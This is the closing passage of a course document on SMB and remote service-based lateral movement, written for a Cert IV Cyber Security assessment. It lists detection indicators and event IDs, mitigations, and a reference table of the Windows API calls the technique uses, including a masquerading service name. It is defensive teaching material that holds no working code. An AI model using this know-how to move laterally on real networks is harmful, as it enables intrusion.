> This lateral movement technique teaches SMB authentication, remote SCM, and service-based execution. It does not teach operational lateral movement. In the real world, LAPS and network segmentation made this exact technique **unreliable** on hardened networks. The value is understanding how Windows remote administration works. Learn pass-the-hash and WMI remoting next.

---

## 5. Detection Vectors

### 5.1 Network Detection (IDS/IPS)

| Indicator | Detection Method |
|-----------|-----------------|
| SMB traffic to `C$` or `ADMIN$` from non-admin workstations | Monitor SMB share access logs |
| File writes to `\\*\C$\Windows\Temp\*.exe` | SMB file auditing (Event ID 5140) |
| Remote service creation via RPC to `svcctl` | RPC operation auditing |
| Unusual `IPC$` authentication attempts | Failed logon monitoring (Event ID 4625) |

### 5.2 Host Detection (Endpoint/EDR)

| Indicator | Windows Event / Artifact |
|-----------|-------------------------|
| Service creation | Security Log Event ID 4697, System Log Event ID 7045 |
| Service named `WinDefendUpdate` or similar masquerade | Anomaly detection on service names |
| New executable in `C:\Windows\Temp` | File integrity monitoring |
| Process running as SYSTEM from Temp directory | Behavioural EDR rules |
| Network connection from `C:\Windows\Temp\*.exe` | EDR network telemetry |

### 5.3 Specific Event IDs to Monitor

- **4624** — An account was successfully logged on (look for Logon Type 3 = Network)
- **4625** — An account failed to log on (brute force detection)
- **4648** — A logon was attempted using explicit credentials
- **4697** — A service was installed in the system (requires audit policy)
- **7045** — A service was installed in the system (from System log — always generated)
- **5140** — A network share object was accessed (requires object auditing)

### 5.4 Mitigations

1. **Disable administrative shares** — Set `AutoShareServer = 0` and `AutoShareWks = 0` in registry (though this breaks many admin tools)
2. **Restrict lateral movement** — Use Windows Firewall to block SMB (445) between workstations
3. **Local Administrator Password Solution (LAPS)** — Ensures unique local admin passwords per machine
4. **Privileged Access Workstations (PAW)** — Admin tasks only from hardened, dedicated machines
5. **Just Enough Administration (JEA)** — Limit admin rights with PowerShell constrained endpoints
6. **EDR behavioural rules** — Alert on service creation from non-standard paths, especially `Temp` directories

---

## 6. Summary Table: Function Reference

| Function | Library | Purpose |
|----------|---------|---------|
| `WNetAddConnection2A` | `mpr.dll` | Authenticate to remote SMB share |
| `WNetCancelConnection2A` | `mpr.dll` | Disconnect from remote share |
| `CopyFileA` | `kernel32.dll` | Copy file (supports UNC paths) |
| `OpenSCManagerA` | `advapi32.dll` | Open handle to remote SCM |
| `CreateServiceA` | `advapi32.dll` | Create a new Windows service |
| `OpenServiceA` | `advapi32.dll` | Open handle to existing service |
| `StartServiceA` | `advapi32.dll` | Start a service (trigger execution) |
| `DeleteService` | `advapi32.dll` | Remove a service from SCM database |
| `CloseServiceHandle` | `advapi32.dll` | Close SCM/service handle |
| `Sleep` | `kernel32.dll` | Pause thread execution |
| `GetLastError` | `kernel32.dll` | Retrieve last error code |
| `printf` | CRT (`ucrtbase.dll`) | Print formatted text to console |
| `_snprintf` | CRT | Format string into buffer safely |

---

*Document compiled for Cert IV Cyber Security final assessment. Understand the code, understand the attack, and most importantly — understand how to detect and defend against it.*
